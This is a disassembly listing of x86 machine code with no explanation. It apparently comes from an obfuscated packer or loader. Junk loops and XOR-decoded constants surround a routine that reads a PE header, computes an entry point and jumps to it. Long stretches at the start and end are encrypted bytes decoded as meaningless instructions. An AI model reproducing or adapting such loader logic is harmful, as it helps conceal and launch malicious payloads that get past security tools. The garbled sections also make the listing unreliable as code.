  40d77d:	mov    ebp,0xc7e50695
  40d782:	mov    ebx,0xbbe6de8f
  40d787:	aam    0x5c
  40d789:	in     eax,dx
  40d78a:	xchg   ecx,eax
  40d78b:	aam    0x82
  40d78d:	fld    QWORD PTR cs:[ebx-0x34]
  40d791:	cmp    ch,bh
  40d793:	hlt    
  40d794:	dec    edx
  40d795:	dec    ecx
  40d796:	pop    ss
  40d797:	dec    edi
  40d798:	push   eax
  40d799:	sub    al,BYTE PTR [edi]
  40d79b:	or     BYTE PTR [edi],bl
  40d79d:	push   esi
  40d79e:	mov    ebx,0xbf4098a9
  40d7a3:	hlt    
  40d7a4:	adc    eax,0xe7f12f5
  40d7a9:	scas   al,BYTE PTR es:[edi]
  40d7aa:	inc    DWORD PTR [esi]
  40d7ac:	mov    dl,0x57
  40d7ae:	pop    eax
  40d7af:	scas   al,BYTE PTR es:[edi]
  40d7b0:	inc    ebx
  40d7b1:	retf   0xae03
  40d7b4:	pop    esi
  40d7b5:	push   esp
  40d7b6:	dec    ebx
  40d7b7:	mov    edi,0xf36aa199
  40d7bc:	sbb    DWORD PTR [ebp-0xe],ecx
  40d7bf:	aam    0xe7
  40d7c1:	scas   eax,DWORD PTR es:[edi]
  40d7c2:	mov    BYTE PTR [edx-0x15d0a1ec],ah
  40d7c8:	xor    DWORD PTR [eax-0x40],ebp
  40d7cb:	out    dx,eax
  40d7cc:	mov    ebx,0x10bef2c6
  40d7d1:	out    0xd2,eax
  40d7d3:	sqrtps xmm4,XMMWORD PTR [ecx]
  40d7d6:	outs   dx,BYTE PTR ds:[esi]
  40d7d7:	ins    DWORD PTR es:[edi],dx
  40d7d8:	mov    al,0x9e
  40d7da:	test   BYTE PTR [ebx],dh
  40d7dc:	xchg   BYTE PTR [edi],cl
  40d7de:	jbe    0x40d7bb
  40d7e0:	pop    ecx
  40d7e1:	sahf   
  40d7e2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d7e3:	in     eax,dx
  40d7e4:	jmp    0x37c549e6
  40d7e9:	xor    ecx,DWORD PTR [ebx+0x308729a2]
  40d7ef:	call   0x328f90a1
  40d7f4:	xchg   edi,eax
  40d7f5:	mov    esi,0x9d38be2c
  40d7fa:	pop    esp
  40d7fb:	inc    eax
  40d7fc:	jecxz  0x40d7f2
  40d7fe:	mov    WORD PTR [ebx+0xd],ds
  40d801:	inc    esi
  40d802:	getsec 
  40d804:	fsubr  st,st(6)
  40d806:	stos   DWORD PTR es:[edi],eax
  40d807:	push   eax
  40d808:	push   0xffffffaa
  40d80a:	xlat   BYTE PTR ds:[bx]
  40d80c:	xor    eax,0x56334767
  40d811:	mov    dl,0x2d
  40d813:	cmp    al,0x5e
  40d815:	or     al,0xe2
  40d817:	lea    ecx,[eax]
  40d819:	push   esi
  40d81a:	inc    esp
  40d81b:	sti    
  40d81c:	lock xchg ebx,eax
  40d81e:	in     al,0xc7
  40d820:	ss push edx
  40d822:	or     DWORD PTR cs:[ecx],esp
  40d825:	adc    al,0x4
  40d827:	jge    0x40d823
  40d829:	add    eax,0xb762a2e5
  40d82e:	and    eax,0xecaef70d
  40d833:	jno    0x40d8a3
  40d835:	dec    esp
  40d836:	int    0x16
  40d838:	nop
  40d839:	sub    esp,DWORD PTR [edx]
  40d83b:	cmp    DWORD PTR [esi+0x6b],ebx
  40d83e:	stos   DWORD PTR es:[edi],eax
  40d83f:	push   ss
  40d840:	mov    esp,0xf1c14bf5
  40d845:	xchg   esi,eax
  40d846:	daa    
  40d847:	xor    al,0x53
  40d849:	add    eax,0xf610b926
  40d84e:	adc    BYTE PTR [edx-0x69],bl
  40d851:	adc    eax,0xea3aacd3
  40d856:	loopne 0x40d7e1
  40d858:	dec    ebp
  40d859:	test   eax,0x31ebf945
  40d85e:	ins    DWORD PTR es:[edi],dx
  40d85f:	cmp    DWORD PTR [esp+esi*8-0x58015c06],0x33
  40d867:	gs cmp bl,bl
  40d86a:	and    DWORD PTR ds:0x1a227a87,ecx
  40d870:	dec    ebx
  40d871:	adc    eax,0x8bf07d03
  40d876:	push   ebp
  40d877:	loopne 0x40d804
  40d879:	pop    ebp
  40d87a:	clc    
  40d87b:	xor    edx,eax
  40d87d:	add    edx,ecx
  40d87f:	imul   edx,ebx
  40d882:	cmp    edx,edi
  40d884:	jbe    0x40a7b9
  40d88a:	pop    ebx
  40d88b:	pop    edi
  40d88c:	leave  
  40d88d:	ret    0x8
  40d890:	push   ebp
  40d891:	mov    ebp,esp
  40d893:	sub    esp,0x70
  40d896:	or     DWORD PTR ds:0x42fc69,0x42e09c
  40d8a0:	push   0x41b2bc
  40d8a5:	sbb    DWORD PTR ds:0x42fcf6,0x42fc71
  40d8af:	call   DWORD PTR ds:0x42e417
  40d8b5:	and    DWORD PTR ds:0x42fc7d,0x42fd02
  40d8bf:	test   ax,ax
  40d8c2:	jne    0x40d8d9
  40d8c8:	xor    eax,eax
  40d8ca:	mov    DWORD PTR ds:0x42e0b4,0x1bc4
  40d8d4:	jmp    0x40e0cc
  40d8d9:	adc    DWORD PTR ds:0x42e0a4,0x42fc69
  40d8e3:	push   0x41b2d4
  40d8e8:	call   DWORD PTR ds:0x42e48f
  40d8ee:	sbb    DWORD PTR ds:0x42e67b,0x42fcf2
  40d8f8:	test   ax,ax
  40d8fb:	mov    DWORD PTR ds:0x42fc75,0x74f8
  40d905:	je     0x40d8c8
  40d90b:	call   DWORD PTR ds:0x42e3d7
  40d911:	cdq    
  40d912:	mov    DWORD PTR ds:0x42fc85,0x1251
  40d91c:	cmp    eax,0x45767589
  40d921:	jne    0x40d98c
  40d927:	mov    DWORD PTR ds:0x42fcf6,0x294f
  40d931:	cmp    edx,0x87676567
  40d937:	jne    0x40d98c
  40d93d:	push   0x0
  40d93f:	push   0x0
  40d941:	adc    DWORD PTR ds:0x42e0a4,0x42e677
  40d94b:	push   0x9879874
  40d950:	push   0x45
  40d952:	push   0x1
  40d954:	push   0x545
  40d959:	push   0x87686787
  40d95e:	xor    DWORD PTR ds:0x42fcee,0x75b9
  40d968:	push   0x9879877
  40d96d:	or     DWORD PTR ds:0x42fc6d,0x42e098
  40d977:	call   DWORD PTR ds:0x42e41f
  40d97d:	mov    DWORD PTR ds:0x42e09c,0x1611
  40d987:	jmp    0x40e0cc
  40d98c:	push   0x41b2e0
  40d991:	call   DWORD PTR ds:0x42e30f
  40d997:	test   eax,eax
  40d999:	je     0x40d9cd
  40d99f:	sbb    DWORD PTR ds:0x42fc81,0x42e0b4
  40d9a9:	push   0x41b314
  40d9ae:	and    DWORD PTR ds:0x42fc6d,0x2b9d
  40d9b8:	call   DWORD PTR ds:0x42e27b
  40d9be:	mov    DWORD PTR ds:0x42fd0a,0x47ee
  40d9c8:	jmp    0x40e0cc
  40d9cd:	push   ebx
  40d9ce:	mov    ebx,0xf89c8531
  40d9d3:	add    DWORD PTR ds:0x42e098,ebx
  40d9d9:	mov    DWORD PTR [ebp-0x8],ebx
  40d9dc:	and    DWORD PTR ds:0x42fc75,0x0
  40d9e6:	mov    ecx,DWORD PTR ds:0x42fc75
  40d9ec:	inc    ecx
  40d9ed:	mov    DWORD PTR ds:0x42fc75,ecx
  40d9f3:	cmp    DWORD PTR ds:0x42fc75,0xf
  40d9fa:	jne    0x40da20
  40da00:	push   0x1990
  40da05:	push   0x7f06
  40da0a:	push   0x857e
  40da0f:	push   DWORD PTR [ebp-0x28]
  40da12:	push   0x42e10d
  40da17:	push   DWORD PTR [ebp-0x10]
  40da1a:	call   DWORD PTR ds:0x42e4cf
  40da20:	cmp    DWORD PTR ds:0x42fc75,0xe
  40da27:	jne    0x40da3a
  40da2d:	mov    ecx,DWORD PTR ds:0x42fc75
  40da33:	inc    ecx
  40da34:	mov    DWORD PTR ds:0x42fc75,ecx
  40da3a:	cmp    DWORD PTR ds:0x42fc75,0x1d
  40da41:	jb     0x40d9e6
  40da47:	add    DWORD PTR ds:0x42e683,0x406c
  40da51:	mov    DWORD PTR [ebp-0x4],0xf89c8530
  40da58:	lea    eax,[ebp-0x18]
  40da5b:	adc    DWORD PTR ds:0x42e673,ecx
  40da61:	mov    DWORD PTR [ebp-0x14],eax
  40da64:	adc    DWORD PTR ds:0x42fc51,0x42e09c
  40da6e:	lea    eax,[ebp-0x1c]
  40da71:	mov    DWORD PTR ds:0x42fc85,0x1a
  40da7b:	cmp    DWORD PTR ds:0x42fc85,0x0
  40da82:	je     0x40dbc3
  40da88:	cmp    DWORD PTR ds:0x42fc85,0x1c
  40da8f:	jne    0x40daa1
  40da95:	push   DWORD PTR [ebp-0x1c]
  40da98:	push   DWORD PTR [ebp-0x14]
  40da9b:	call   DWORD PTR ds:0x42e4d3
  40daa1:	xor    ecx,ecx
  40daa3:	add    ecx,DWORD PTR ds:0x42fc85
  40daa9:	dec    ecx
  40daaa:	mov    DWORD PTR ds:0x42fc85,ecx
  40dab0:	jmp    0x40da7b
  40dab5:	mov    DWORD PTR ds:0x42e687,0x1d
  40dabf:	cmp    DWORD PTR ds:0x42e687,0x0
  40dac6:	je     0x40dbc3
  40dacc:	cmp    DWORD PTR ds:0x42e687,0xf
  40dad3:	jne    0x40dae4
  40dad9:	push   0x1303
  40dade:	call   DWORD PTR ds:0x42e3e3
  40dae4:	cmp    DWORD PTR ds:0x42e687,0x10
  40daeb:	jne    0x40dafe
  40daf1:	mov    ecx,DWORD PTR ds:0x42e687
  40daf7:	dec    ecx
  40daf8:	mov    DWORD PTR ds:0x42e687,ecx
  40dafe:	mov    ecx,DWORD PTR ds:0x42e687
  40db04:	dec    ecx
  40db05:	mov    DWORD PTR ds:0x42e687,ecx
  40db0b:	jmp    0x40dabf
  40db10:	mov    DWORD PTR ds:0x42e67f,0x14
  40db1a:	cmp    DWORD PTR ds:0x42e67f,0x0
  40db21:	je     0x40dbc3
  40db27:	cmp    DWORD PTR ds:0x42e67f,0x2
  40db2e:	jne    0x40db41
  40db34:	push   0x1
  40db36:	push   0x279d
  40db3b:	call   DWORD PTR ds:0x42e4d7
  40db41:	cmp    DWORD PTR ds:0x42e67f,0x3
  40db48:	jne    0x40db5b
  40db4e:	mov    ecx,DWORD PTR ds:0x42e67f
  40db54:	dec    ecx
  40db55:	mov    DWORD PTR ds:0x42e67f,ecx
  40db5b:	mov    ecx,DWORD PTR ds:0x42e67f
  40db61:	dec    ecx
  40db62:	mov    DWORD PTR ds:0x42e67f,ecx
  40db68:	jmp    0x40db1a
  40db6d:	mov    DWORD PTR ds:0x42fcf6,0x1a
  40db77:	cmp    DWORD PTR ds:0x42fcf6,0x0
  40db7e:	je     0x40dbc3
  40db84:	cmp    DWORD PTR ds:0x42fcf6,0x6
  40db8b:	jne    0x40db97
  40db91:	call   DWORD PTR ds:0x42e4db
  40db97:	cmp    DWORD PTR ds:0x42fcf6,0x7
  40db9e:	jne    0x40dbb1
  40dba4:	mov    ecx,DWORD PTR ds:0x42fcf6
  40dbaa:	dec    ecx
  40dbab:	mov    DWORD PTR ds:0x42fcf6,ecx
  40dbb1:	mov    ecx,DWORD PTR ds:0x42fcf6
  40dbb7:	dec    ecx
  40dbb8:	mov    DWORD PTR ds:0x42fcf6,ecx
  40dbbe:	jmp    0x40db77
  40dbc3:	mov    DWORD PTR [ebp-0xc],eax
  40dbc6:	or     ecx,eax
  40dbc8:	mov    eax,ds:0x41b1a8
  40dbcd:	or     DWORD PTR ds:0x42e687,edx
  40dbd3:	mov    eax,DWORD PTR [eax+0x1c8]
  40dbd9:	or     DWORD PTR ds:0x42e693,edx
  40dbdf:	mov    eax,DWORD PTR [eax]
  40dbe1:	mov    ecx,DWORD PTR [ebp-0xc]
  40dbe4:	push   esi
  40dbe5:	mov    esi,0x7510855
  40dbea:	sub    DWORD PTR ds:0x42fcfe,0x662
  40dbf4:	xor    eax,esi
  40dbf6:	push   edi
  40dbf7:	and    DWORD PTR ds:0x42fc65,0x0
  40dc01:	jmp    0x40dc13
  40dc06:	mov    edi,DWORD PTR ds:0x42fc65
  40dc0c:	inc    edi
  40dc0d:	mov    DWORD PTR ds:0x42fc65,edi
  40dc13:	cmp    DWORD PTR ds:0x42fc65,0x1d
  40dc1a:	jae    0x40dc4a
  40dc20:	cmp    DWORD PTR ds:0x42fc65,0x2b
  40dc27:	jne    0x40dc45
  40dc2d:	push   0x3dd1
  40dc32:	push   DWORD PTR [ebp-0x24]
  40dc35:	push   0x2bbe
  40dc3a:	push   0x75d2
  40dc3f:	call   DWORD PTR ds:0x42e3e7
  40dc45:	jmp    0x40dc06
  40dc4a:	mov    edi,0x32729c
  40dc4f:	add    eax,edi
  40dc51:	mov    DWORD PTR [ecx],eax
  40dc53:	mov    DWORD PTR ds:0x42e0a8,edx
  40dc59:	mov    eax,ds:0x41b418
  40dc5e:	mov    DWORD PTR ds:0x42fc81,0x477b
  40dc68:	cmp    eax,0x23c13046
  40dc6d:	mov    eax,DWORD PTR [ebp-0x4]
  40dc70:	mov    DWORD PTR ds:0x42fc89,0x45bc
  40dc7a:	je     0x40dd06
  40dc80:	mov    DWORD PTR ds:0x42e677,0x1c
  40dc8a:	cmp    DWORD PTR ds:0x42e677,0x0
  40dc91:	je     0x40dcd6
  40dc97:	cmp    DWORD PTR ds:0x42e677,0xa
  40dc9e:	jne    0x40dcaa
  40dca4:	call   DWORD PTR ds:0x42e3eb
  40dcaa:	cmp    DWORD PTR ds:0x42e677,0xb
  40dcb1:	jne    0x40dcc4
  40dcb7:	mov    ecx,DWORD PTR ds:0x42e677
  40dcbd:	dec    ecx
  40dcbe:	mov    DWORD PTR ds:0x42e677,ecx
  40dcc4:	mov    ecx,DWORD PTR ds:0x42e677
  40dcca:	dec    ecx
  40dccb:	mov    DWORD PTR ds:0x42e677,ecx
  40dcd1:	jmp    0x40dc8a
  40dcd6:	mov    ecx,DWORD PTR [ebp-0x8]
  40dcd9:	sbb    DWORD PTR ds:0x42fd02,0x42e0ac
  40dce3:	xor    eax,esi
  40dce5:	and    DWORD PTR ds:0x42fd02,0x42e0a4
  40dcef:	add    eax,edi
  40dcf1:	imul   eax,ecx
  40dcf4:	mov    DWORD PTR [ebp-0x8],eax
  40dcf7:	mov    DWORD PTR ds:0x42fc51,0x365a
  40dd01:	jmp    0x40ddd3
  40dd06:	sbb    DWORD PTR ds:0x42e098,edx
  40dd0c:	xor    eax,esi
  40dd0e:	add    eax,edi
  40dd10:	and    DWORD PTR ds:0x42fcf2,0x0
  40dd1a:	jmp    0x40dd2c
  40dd1f:	mov    ecx,DWORD PTR ds:0x42fcf2
  40dd25:	inc    ecx
  40dd26:	mov    DWORD PTR ds:0x42fcf2,ecx
  40dd2c:	cmp    DWORD PTR ds:0x42fcf2,0x12
  40dd33:	jae    0x40dd6e
  40dd39:	cmp    DWORD PTR ds:0x42fcf2,0x6
  40dd40:	jne    0x40dd4f
  40dd46:	push   DWORD PTR [ebp-0x24]
  40dd49:	call   DWORD PTR ds:0x42e3ef
  40dd4f:	cmp    DWORD PTR ds:0x42fcf2,0x5
  40dd56:	jne    0x40dd69
  40dd5c:	mov    ecx,DWORD PTR ds:0x42fcf2
  40dd62:	inc    ecx
  40dd63:	mov    DWORD PTR ds:0x42fcf2,ecx
  40dd69:	jmp    0x40dd1f
  40dd6e:	mov    ds:0x41b2b8,eax
  40dd73:	mov    eax,DWORD PTR [ebp-0x8]
  40dd76:	or     DWORD PTR ds:0x42fc8d,edx
  40dd7c:	xor    eax,esi
  40dd7e:	sub    DWORD PTR ds:0x42e0b0,edx
  40dd84:	add    eax,edi
  40dd86:	mov    ds:0x41b418,eax
  40dd8b:	mov    eax,DWORD PTR [ebp-0x4]
  40dd8e:	mov    ecx,DWORD PTR ds:0x41b2b8
  40dd94:	xor    eax,esi
  40dd96:	add    eax,edi
  40dd98:	mov    DWORD PTR ds:0x42fc89,0x3e5c
  40dda2:	cmp    ecx,eax
  40dda4:	jne    0x40ddd3
  40ddaa:	sub    DWORD PTR ds:0x42fd06,0x42fc7d
  40ddb4:	push   DWORD PTR [ebp-0x4]
  40ddb7:	and    DWORD PTR ds:0x42e673,0x4c1c
  40ddc1:	push   DWORD PTR [ebp-0x8]
  40ddc4:	adc    DWORD PTR ds:0x42e67f,0x42fd0a
  40ddce:	call   0x40e0d0
  40ddd3:	mov    eax,ds:0x41b1a8
  40ddd8:	sbb    edx,DWORD PTR ds:0x42e66b
  40ddde:	mov    eax,DWORD PTR [eax+0x18c]
  40dde4:	and    DWORD PTR ds:0x42fc65,0x0
  40ddee:	mov    edx,DWORD PTR ds:0x42fc65
  40ddf4:	inc    edx
  40ddf5:	mov    DWORD PTR ds:0x42fc65,edx
  40ddfb:	cmp    DWORD PTR ds:0x42fc65,0x18
  40de02:	jne    0x40de18
  40de08:	push   0x42fc89
  40de0d:	push   0x42e1ed
  40de12:	call   DWORD PTR ds:0x42e3f3
  40de18:	cmp    DWORD PTR ds:0x42fc65,0x13
  40de1f:	jb     0x40ddee
  40de25:	mov    ecx,DWORD PTR ds:0x42fca1
  40de2b:	mov    ecx,DWORD PTR [ecx]
  40de2d:	or     DWORD PTR ds:0x42fc7d,ecx
  40de33:	mov    eax,DWORD PTR [eax]
  40de35:	mov    DWORD PTR ds:0x42fc75,0x11
  40de3f:	cmp    DWORD PTR ds:0x42fc75,0x0
  40de46:	je     0x40de77
  40de4c:	cmp    DWORD PTR ds:0x42fc75,0x19
  40de53:	jne    0x40de65
  40de59:	push   DWORD PTR [ebp-0xc]
  40de5c:	push   DWORD PTR [ebp-0x10]
  40de5f:	call   DWORD PTR ds:0x42e4df
  40de65:	mov    edx,DWORD PTR ds:0x42fc75
  40de6b:	dec    edx
  40de6c:	mov    DWORD PTR ds:0x42fc75,edx
  40de72:	jmp    0x40de3f
  40de77:	mov    DWORD PTR [ebp-0x20],eax
  40de7a:	mov    eax,0xf89c853d
  40de7f:	mov    DWORD PTR [ebp-0x24],eax
  40de82:	mov    DWORD PTR [ebp-0x24],eax
  40de85:	mov    DWORD PTR [ebp-0x24],eax
  40de88:	mov    DWORD PTR [ebp-0xc],ebx
  40de8b:	mov    DWORD PTR [ebp-0x24],eax
  40de8e:	mov    DWORD PTR [ebp-0x24],0xf89c8539
  40de95:	mov    ebx,DWORD PTR [ebp-0x8]
  40de98:	mov    ecx,DWORD PTR [ebp-0x4]
  40de9b:	mov    edx,DWORD PTR [ebp-0x4]
  40de9e:	xor    edx,esi
  40dea0:	xor    ecx,esi
  40dea2:	add    ecx,edx
  40dea4:	mov    edx,DWORD PTR [ebp-0x4]
  40dea7:	xor    ebx,esi
  40dea9:	xor    edx,esi
  40deab:	add    ebx,edi
  40dead:	lea    ecx,[ecx+edx*1+0x9757d4]
  40deb4:	cmp    ebx,ecx
  40deb6:	ja     0x40df17
  40debc:	mov    eax,DWORD PTR [ebp-0x4]
  40debf:	xor    eax,esi
  40dec1:	lea    eax,[eax+ebx*1+0x32729c]
  40dec8:	push   eax
  40dec9:	mov    eax,DWORD PTR [ebp-0xc]
  40decc:	xor    eax,esi
  40dece:	lea    eax,[ebp+eax*1+0x3272a4]
  40ded5:	push   eax
  40ded6:	mov    eax,ds:0x41b1a8
  40dedb:	push   DWORD PTR [eax+0x1bc]
  40dee1:	call   0x402976
  40dee6:	mov    eax,DWORD PTR [ebp-0x4]
  40dee9:	xor    eax,esi
  40deeb:	lea    ebx,[ebx+eax*1+0x32729c]
  40def2:	mov    eax,DWORD PTR [ebp-0x4]
  40def5:	mov    ecx,DWORD PTR [ebp-0x4]
  40def8:	xor    ecx,esi
  40defa:	xor    eax,esi
  40defc:	add    eax,ecx
  40defe:	mov    ecx,DWORD PTR [ebp-0x4]
  40df01:	xor    ecx,esi
  40df03:	lea    eax,[eax+ecx*1+0x9757d4]
  40df0a:	cmp    ebx,eax
  40df0c:	jbe    0x40debc
  40df12:	mov    eax,0xf89c853d
  40df17:	mov    ecx,DWORD PTR [ebp+0xc]
  40df1a:	mov    DWORD PTR ds:0x41b02c,ecx
  40df20:	mov    ecx,DWORD PTR [ebp+0x10]
  40df23:	mov    DWORD PTR ds:0x41b280,ecx
  40df29:	mov    ecx,DWORD PTR ds:0x41b02c
  40df2f:	mov    edx,DWORD PTR [ebp-0x14]
  40df32:	sub    ecx,edi
  40df34:	xor    ecx,esi
  40df36:	mov    DWORD PTR [edx],ecx
  40df38:	mov    ecx,DWORD PTR [ebp-0x18]
  40df3b:	cmp    ecx,0xf89c8530
  40df41:	je     0x40df9e
  40df47:	mov    ecx,DWORD PTR [ebp-0x8]
  40df4a:	mov    edx,DWORD PTR [ebp-0x1c]
  40df4d:	xor    ecx,esi
  40df4f:	add    ecx,edi
  40df51:	cmp    ecx,edx
  40df53:	je     0x40df9e
  40df59:	mov    eax,ds:0x41b1a8
  40df5e:	mov    eax,DWORD PTR [eax+0x194]
  40df64:	mov    ecx,DWORD PTR [eax]
  40df66:	mov    eax,DWORD PTR [ecx+0x3c]
  40df69:	push   DWORD PTR ds:0x41b280
  40df6f:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  40df73:	push   DWORD PTR ds:0x41b02c
  40df79:	add    eax,ecx
  40df7b:	mov    ecx,DWORD PTR ds:0x41b1a8
  40df81:	mov    ecx,DWORD PTR [ecx+0x194]
  40df87:	push   DWORD PTR [ecx]
  40df89:	call   eax
  40df8b:	mov    ecx,DWORD PTR ds:0x41b1a8
  40df91:	mov    ecx,DWORD PTR [ecx+0x1cc]
  40df97:	mov    DWORD PTR [ecx],eax
  40df99:	jmp    0x40e0ae
  40df9e:	mov    ecx,DWORD PTR [ebp-0x8]
  40dfa1:	mov    edx,DWORD PTR [ebp-0x20]
  40dfa4:	xor    ecx,esi
  40dfa6:	add    ecx,edi
  40dfa8:	cmp    ecx,edx
  40dfaa:	jne    0x40e091
  40dfb0:	mov    ecx,DWORD PTR [ebp-0x8]
  40dfb3:	xor    ecx,esi
  40dfb5:	add    ecx,edi
  40dfb7:	mov    DWORD PTR ds:0x41b22c,ecx
  40dfbd:	mov    ecx,DWORD PTR [ebp-0x8]
  40dfc0:	xor    ecx,esi
  40dfc2:	add    ecx,edi
  40dfc4:	mov    DWORD PTR ds:0x41b224,ecx
  40dfca:	mov    ecx,DWORD PTR [ebp-0x4]
  40dfcd:	mov    DWORD PTR [ebp-0xc],ecx
  40dfd0:	mov    ecx,DWORD PTR [ebp-0x8]
  40dfd3:	mov    DWORD PTR [ebp+0xc],ecx
  40dfd6:	mov    ecx,DWORD PTR [ebp+0xc]
  40dfd9:	xor    ecx,esi
  40dfdb:	add    ecx,edi
  40dfdd:	mov    DWORD PTR [ebp+0xc],ecx
  40dfe0:	mov    ecx,DWORD PTR ds:0x41b028
  40dfe6:	mov    ecx,DWORD PTR [ecx]
  40dfe8:	mov    DWORD PTR [ebp+0xc],ecx
  40dfeb:	mov    ecx,DWORD PTR ds:0x41b230
  40dff1:	mov    ecx,DWORD PTR [ecx]
  40dff3:	mov    DWORD PTR [ebp-0x14],ecx
  40dff6:	mov    DWORD PTR [ebp+0x10],0xf89c8731
  40dffd:	mov    ecx,DWORD PTR [ebp+0x10]
  40e000:	xor    ecx,esi
  40e002:	add    ecx,edi
  40e004:	mov    DWORD PTR [ebp+0x10],ecx
  40e007:	mov    ecx,DWORD PTR ds:0x41b1a8
  40e00d:	mov    DWORD PTR [ebp+0x10],ecx
  40e010:	mov    ecx,DWORD PTR [ebp+0xc]
  40e013:	mov    DWORD PTR [ebp+0xc],ecx
  40e016:	mov    ecx,DWORD PTR [ebp+0xc]
  40e019:	push   0x4
  40e01b:	pop    edx
  40e01c:	sub    edx,ecx
  40e01e:	add    edx,DWORD PTR [ebp-0x14]
  40e021:	mov    DWORD PTR [ebp-0x24],0xf89c85f1
  40e028:	mov    DWORD PTR [ebp+0x10],edx
  40e02b:	mov    DWORD PTR [ebp-0x70],eax
  40e02e:	mov    eax,DWORD PTR [ebp+0xc]
  40e031:	mov    DWORD PTR [ebp-0x6c],eax
  40e034:	mov    eax,DWORD PTR [ebp+0x10]
  40e037:	mov    DWORD PTR [ebp-0x68],eax
  40e03a:	mov    eax,DWORD PTR [ebp-0x24]
  40e03d:	xor    eax,esi
  40e03f:	add    eax,edi
  40e041:	mov    DWORD PTR [ebp-0x64],eax
  40e044:	lea    eax,[ebp-0x2c]
  40e047:	mov    DWORD PTR [ebp-0x60],eax
  40e04a:	mov    eax,DWORD PTR [ebp-0x70]
  40e04d:	xor    eax,esi
  40e04f:	add    eax,edi
  40e051:	mov    DWORD PTR [ebp-0x70],eax
  40e054:	lea    eax,[ebp-0x70]
  40e057:	push   eax
  40e058:	mov    eax,DWORD PTR [ebp-0xc]
  40e05b:	xor    eax,esi
  40e05d:	add    eax,edi
  40e05f:	push   eax
  40e060:	mov    eax,ds:0x41b1c8
  40e065:	push   0x41b11e
  40e06a:	push   DWORD PTR [eax]
  40e06c:	call   0x4120bb
  40e071:	xor    esi,esi
  40e073:	mov    eax,DWORD PTR [ebp+0x10]
  40e076:	sub    eax,esi
  40e078:	push   eax
  40e079:	mov    eax,DWORD PTR [ebp+0xc]
  40e07c:	add    eax,esi
  40e07e:	push   eax
  40e07f:	call   0x4099c9
  40e084:	inc    esi
  40e085:	cmp    esi,0x52
  40e088:	jb     0x40e073
  40e08e:	mov    eax,DWORD PTR [ebp-0xc]
  40e091:	call   0x406acb
  40e096:	lea    eax,[ebp+0x4]
  40e099:	mov    DWORD PTR [ebp-0x28],eax
  40e09c:	mov    eax,DWORD PTR [ebp-0x10]
  40e09f:	mov    eax,DWORD PTR [ebp-0x4]
  40e0a2:	push   DWORD PTR [ebp-0x8]
  40e0a5:	lea    eax,[ebp-0x28]
  40e0a8:	push   eax
  40e0a9:	call   0x410b90
  40e0ae:	mov    eax,ds:0x41b1a8
  40e0b3:	push   0x4
  40e0b5:	add    eax,0x1cc
  40e0ba:	push   eax
  40e0bb:	lea    eax,[ebp-0x10]
  40e0be:	push   eax
  40e0bf:	call   0x402976
  40e0c4:	mov    eax,DWORD PTR [ebp-0x10]
  40e0c7:	mov    eax,DWORD PTR [eax]
  40e0c9:	pop    edi
  40e0ca:	pop    esi
  40e0cb:	pop    ebx
  40e0cc:	leave  
  40e0cd:	ret    0xc
  40e0d0:	push   ebp
  40e0d1:	mov    ebp,esp
  40e0d3:	sub    esp,0x24
  40e0d6:	mov    eax,ds:0x41b1a8
  40e0db:	mov    eax,DWORD PTR [eax+0x198]
  40e0e1:	mov    DWORD PTR [ebp-0x8],eax
  40e0e4:	adc    ecx,eax
  40e0e6:	mov    eax,DWORD PTR [ebp+0x8]
  40e0e9:	mov    ecx,DWORD PTR [ebp-0x8]
  40e0ec:	xor    DWORD PTR ds:0x42fc69,0x42fc55
  40e0f6:	push   ebx
  40e0f7:	push   esi
  40e0f8:	mov    esi,0x7510855
  40e0fd:	xor    eax,esi
  40e0ff:	not    ebx
  40e101:	push   edi
  40e102:	mov    edi,0x32729c
  40e107:	add    eax,edi
  40e109:	sbb    ebx,DWORD PTR ds:0x42fc69
  40e10f:	jmp    0x40e279
  40e114:	sub    dl,0xce
  40e117:	gs push 0x61
  40e11a:	mov    bh,0xf1
  40e11c:	fstp   DWORD PTR [ecx+0x5015d044]
  40e122:	jmp    0xc370:0x70a668f8
  40e129:	jg     0x40e19b
  40e12b:	jo     0x40e0d0
  40e12d:	mov    ds:0xe17367c8,eax
  40e132:	sbb    al,0x29
  40e134:	add    BYTE PTR [esi+0x1ee1e7f],ch
  40e13a:	adc    al,0xe2
  40e13c:	std    
  40e13d:	(bad)  
  40e13e:	outs   dx,DWORD PTR ds:[esi]
  40e13f:	outs   dx,BYTE PTR ds:[esi]
  40e140:	shl    DWORD PTR [ebp-0x40fc79c2],cl
  40e146:	loope  0x40e0cc
  40e148:	lahf   
  40e149:	adc    cl,BYTE PTR [ecx-0x74]
  40e14c:	fbld   TBYTE PTR [esi+0x6f43353b]
  40e152:	dec    edi
  40e153:	push   es
  40e154:	into   
  40e155:	(bad)  ds:0x9a0173a8
  40e15b:	lods   al,BYTE PTR ds:[esi]
  40e15c:	adc    al,0x37
  40e15e:	fld    TBYTE PTR [ebx-0x428e02db]
  40e164:	shr    bh,0xf1
  40e167:	dec    BYTE PTR ds:0xf5303461
  40e16d:	ins    DWORD PTR es:[edi],dx
  40e16e:	das    
  40e16f:	push   esp
  40e170:	sbb    dh,dh
  40e172:	inc    eax
  40e173:	int3   
  40e174:	cmp    dh,cl
  40e176:	pusha  
  40e177:	ret    
  40e178:	xchg   ebp,eax
  40e179:	fsubr  QWORD PTR [edi+0x4d]
  40e17c:	inc    ecx
  40e17d:	push   0x7d
  40e17f:	pop    es
  40e180:	dec    DWORD PTR [eax-0x362966cd]
  40e186:	pop    edi
  40e187:	xlat   BYTE PTR ds:[ebx]
  40e188:	(bad)  
  40e189:	or     eax,0x907c0f7b
  40e18e:	push   ebx
  40e18f:	mov    cl,0x8b
  40e191:	les    esp,FWORD PTR [edx+0xded48d1]
  40e197:	test   al,0xc2
  40e199:	call   0xd864c134
  40e19e:	adc    esp,ecx
  40e1a0:	or     al,0x38
  40e1a2:	int3   
  40e1a3:	sbb    al,0xfe
  40e1a5:	lds    eax,FWORD PTR [edx-0x75]
  40e1a8:	or     al,0xfa
  40e1aa:	pop    ebp
  40e1ab:	ins    BYTE PTR es:[edi],dx
  40e1ac:	adc    al,0x0
  40e1ae:	pop    edx
  40e1af:	mov    ch,BYTE PTR [ebx+eax*4-0x17a1e318]
  40e1b6:	rcl    BYTE PTR [edx+0x56024cd3],0xc2
  40e1bd:	push   ebp
  40e1be:	ds rcr ch,1
  40e1c1:	hlt    
  40e1c2:	sbb    DWORD PTR [edx],esp
  40e1c4:	out    dx,eax
  40e1c5:	ins    DWORD PTR es:[edi],dx
  40e1c6:	ror    DWORD PTR [edi],cl
